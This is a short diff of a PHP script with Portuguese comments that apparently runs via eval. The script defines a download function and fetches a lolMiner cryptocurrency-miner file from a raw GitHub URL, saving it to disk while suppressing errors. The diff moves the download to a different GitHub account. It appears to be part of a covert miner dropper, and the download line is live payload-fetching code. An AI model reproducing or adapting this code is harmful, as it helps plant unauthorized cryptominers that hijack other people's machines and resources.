@@ -4,7 +4,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 *Atenção, este comando não esta sendo executado devido a mudança da url da conta. use só o comando do blg
 
 
-[__GIT_COMMAND]
+[GIT_COMMAND]
 
 $GLOBALS['__download_002'] = function($url, $post = false)
 {
@@ -104,7 +104,7 @@ if(1)
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
+		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/mateusdevjun/myproj/refs/heads/main/lolminer/lolMiner_1.95.dat');
 		if($data && strlen($data) > 9000)
 			@file_put_contents($lolm_path, $data);
 		else
